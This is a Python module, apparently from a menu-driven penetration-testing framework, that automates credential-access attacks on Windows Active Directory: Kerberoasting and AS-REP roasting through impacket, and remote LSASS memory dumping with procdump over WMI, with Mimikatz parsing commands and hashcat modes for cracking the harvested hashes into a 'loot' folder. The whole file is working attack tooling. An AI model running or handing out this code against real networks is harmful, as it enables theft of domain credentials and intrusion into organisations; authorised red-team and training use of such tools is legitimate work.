import subprocess
import shlex
import os
from datetime import datetime
from modules import execution

def run():
    while True:
        print("\n--- Credential Access ---")
        print("1. Kerberoasting")
        print("2. AS-REP Roasting")
        print("3. Dump LSASS (Mimikatz)")
        print("99. Return to Main Menu")

        choice = input("Enter your choice: ")

        if choice == '1':
            target_ip = input("Enter Target IP (Domain Controller): ")
            domain = input("Enter Target Domain (e.g., contoso.local): ")
            username = input("Enter Username: ")
            password = input("Enter Password: ")
            kerberoast(target_ip, domain, username, password)
        elif choice == '2':
            target_ip = input("Enter Target IP (Domain Controller): ")
            domain = input("Enter Target Domain (e.g., contoso.local): ")
            asrep_roast(target_ip, domain)
        elif choice == '3':
            dump_lsass()
        elif choice == '99':
            print("Returning to main menu...")
            return
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")

def ensure_loot_dir():
    """Ensures the loot directory exists."""
    if not os.path.exists("loot"):
        os.makedirs("loot")

def dump_lsass():
    print("\n[+] LSASS Dump Workflow")
    print("[!] This requires administrative rights on the target machine.")
    print("[!] You must have uploaded procdump.exe to the target (e.g., to C:\\temp\\procdump.exe).")

    domain = input("Enter Target Domain: ")
    target_ip = input("Enter IP of the target host to dump LSASS from: ")
    username = input("Enter Username (with admin rights on target): ")
    password = input("Enter Password: ")
    
    procdump_path = input("Enter the full path to procdump.exe on the target machine: ")
    dump_path = "C:\\Windows\\Temp\\lsass.dmp" # A common writable directory
    
    # Command to dump the lsass.exe process
    # -ma: Write a full dump file.
    # -accepteula: Silently accept the EULA.
    # lsass.exe: The process to dump.
    # dump_path: Where to save the dump file.
    command_to_run = f"{procdump_path} -ma -accepteula lsass.exe {dump_path}"
    
    print("\n[*] Preparing to execute procdump on the target...")
    if execution.wmi_exec(target_ip, domain, username, password, command_to_run):
        print("\n[+] Procdump command sent successfully.")
        print(f"[*] The LSASS dump should now be at {dump_path} on the target machine.")
        print("[*] You must retrieve this file and use Mimikatz on your attacker machine to parse it.")
        print("[*] Example Mimikatz command: `sekurlsa::minidump lsass.dmp` followed by `sekurlsa::logonpasswords`")
    else:
        print("\n[-] Failed to execute procdump.")
    
    input("\nPress Enter to continue...")

def kerberoast(target_ip, domain, username, password):
    print("\n[+] Performing Kerberoasting attack...")
    
    # Format: domain/username:password
    credentials = f"{domain}/{username}:{password}"
    
    command = [
        "impacket-getuserspns",
        "-dc-ip", target_ip,
        "-request",
        credentials
    ]

    print(f"[*] Running command: {' '.join(command)}")

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("\n[+] Command executed successfully. Found crackable hashes:")
        print("-" * 60)
        print(result.stdout)
        print(result.stderr)
        print("-" * 60)
        print("[*] Copy the hash into a file and use Hashcat or John the Ripper to crack it.")

    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
    input("\nPress Enter to continue...")



def asrep_roast(target_ip, domain):
    """
    Performs AS-REP Roasting using impacket's GetNPUsers.py.
    """
    print("\n[+] Performing AS-REP Roasting attack...")
    ensure_loot_dir()
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    output_file = os.path.join("loot", f"asrep_hashes_{timestamp}.txt")
    
    target = f"{domain}/" 
    
    command = [
        "impacket-getnpusers",
        target,
        "-dc-ip", target_ip,
        "-request",
        "-format", "hashcat",
        "-outputfile", output_file
    ]
    print(f"[*] Running command: {' '.join(command)}")

    try:
        result = subprocess.run(command, capture_output=True, text=True)
        
        print("\n[+] Command executed. Checking for results...")
        print("-" * 60)
        print(result.stdout)
        print(result.stderr)
        print("-" * 60)

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(f"[+] Success! Crackable hashes saved to: {output_file}")
            print("[*] Use Hashcat with mode 18200 to crack these hashes.")
        else:
            print("[-] No users vulnerable to AS-REP Roasting were found.")
            if os.path.exists(output_file):
                os.remove(output_file) # Clean up empty file

    except FileNotFoundError:
        print("\n[!] ERROR: 'impacket-getnpusers' not found.")
        print("[!] Please ensure impacket is installed and in your system's PATH.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
    
    input("\nPress Enter to continue...")


